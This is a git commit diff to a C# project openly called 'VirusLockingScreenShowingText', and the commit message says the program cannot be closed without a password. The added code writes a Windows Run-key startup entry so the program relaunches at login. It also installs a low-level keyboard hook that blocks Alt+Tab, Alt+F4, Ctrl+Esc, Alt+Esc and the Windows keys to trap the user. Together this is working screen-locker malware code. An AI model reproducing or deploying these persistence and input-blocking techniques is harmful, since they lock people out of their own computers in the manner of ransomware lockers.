5ba6c7f62a848d0f83d24932578e1717cd2433df
MrMerowind <mrmerowind@gmail.com>
2022-07-17 13:49:40 +0200

    Fixed registry key. Can not close the program without password.

--- VirusLockingScreenShowingText/MainWindow.xaml.cs
+++ VirusLockingScreenShowingText/MainWindow.xaml.cs
@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows;
@@ -43,7 +44,7 @@ namespace VirusLockingScreenShowingText
         {
             using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
             {
-                key.SetValue("BetterDeleteThisByMero", "\"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"");
+                key.SetValue("BetterDeleteThisByMero", "\"" + System.IO.Path.ChangeExtension(System.Reflection.Assembly.GetExecutingAssembly().Location, ".exe") + "\"");
             }
         }
 
@@ -58,6 +59,12 @@ namespace VirusLockingScreenShowingText
         public MainWindow()
         {
             InitializeComponent();
+
+            // hook keyboard
+            IntPtr hModule = GetModuleHandle(IntPtr.Zero);
+            hookProc = new LowLevelKeyboardProcDelegate(LowLevelKeyboardProc);
+            hHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, hModule, 0);
+
             this.WindowState = WindowState.Minimized;
 
             AddApplicationToStartup();
@@ -84,6 +91,65 @@ namespace VirusLockingScreenShowingText
                 DeleteApplicationFromStartup();
                 Application.Current.Shutdown();
             }
+        }
+
+        /// Magic here
+        private struct KBDLLHOOKSTRUCT
+        {
+            public int vkCode;
+        int scanCode;
+        public int flags;
+        int time;
+        int dwExtraInfo;
+        }
+
+        private delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, IntPtr hMod, int dwThreadId);
+
+        [DllImport("user32.dll")]
+        private static extern bool UnhookWindowsHookEx(IntPtr hHook);
+
+        [DllImport("user32.dll")]
+        private static extern int CallNextHookEx(int hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetModuleHandle(IntPtr path);
+
+        private IntPtr hHook;
+        LowLevelKeyboardProcDelegate hookProc; // prevent gc
+        const int WH_KEYBOARD_LL = 13;
+
+
+        private static int LowLevelKeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
+        {
+            if (nCode >= 0)
+                switch (wParam)
+                {
+                    case 256: // WM_KEYDOWN
+                    case 257: // WM_KEYUP
+                    case 260: // WM_SYSKEYDOWN
+                    case 261: // M_SYSKEYUP
+                        if (
+                            (lParam.vkCode == 0x09 && lParam.flags == 32) || // Alt+Tab
+                            (lParam.vkCode == 0x1b && lParam.flags == 32) || // Alt+Esc
+                            (lParam.vkCode == 0x73 && lParam.flags == 32) || // Alt+F4
+                            (lParam.vkCode == 0x1b && lParam.flags == 0) || // Ctrl+Esc
+                            (lParam.vkCode == 0x5b && lParam.flags == 1) || // Left Windows Key 
+                            (lParam.vkCode == 0x5c && lParam.flags == 1))    // Right Windows Key 
+                        {
+                            return 1; //Do not handle key events
+                        }
+                        break;
+                }
+            return CallNextHookEx(0, nCode, wParam, ref lParam);
+        }
+
+
+        private void Window_Closed(object sender, EventArgs e)
+        {
+            UnhookWindowsHookEx(hHook); // release keyboard hook
         }
     }
 }
